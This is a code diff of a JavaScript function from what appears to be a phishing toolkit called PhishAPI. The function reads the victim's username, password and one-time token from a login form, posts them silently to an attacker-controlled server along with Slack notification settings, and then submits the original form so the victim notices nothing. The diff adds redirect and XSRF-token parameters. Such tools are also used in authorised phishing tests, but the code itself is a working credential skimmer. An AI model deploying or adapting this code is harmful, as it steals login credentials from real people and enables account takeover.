@@ -1,4 +1,4 @@
-function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID){
+function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID,RedirURL,XSRFToken){
 	// Phisher Controlled Variables
 	var APIPortal = SubForm.arguments[0];
 	var FormName = SubForm.arguments[1];
@@ -7,6 +7,8 @@ function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInpu
 	var SlackEmoji = SubForm.arguments[4];
 	var UsernameInputID = SubForm.arguments[5];
 	var PasswordInputID = SubForm.arguments[6];
+	var RedirURL = SubForm.arguments[7];
+	var XSRFToken = SubForm.arguments[8];
 	// Vistim Controlled Variables
 	var Username = document.getElementById(UsernameInputID).value;
 	var Password = document.getElementById(PasswordInputID).value;
@@ -14,14 +16,16 @@ function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInpu
     if(Token){
         var Token = Token.value;
     } else {
-		Token = "";
+		Token = '';
 	}
+	
+	var URL = 'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji+'&xsrftoken='+XSRFToken+'&redirurl='+RedirURL;
 
     $.ajax({
         // Post Transparent AJAX Request to PhishAPI Server
 		url:APIPortal,
         type:'post',
-		data:'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji,
+		data:encodeURI(URL),
         success:function (){		
 				// Submit Original Form
 				var x = document.getElementsByName(FormName);
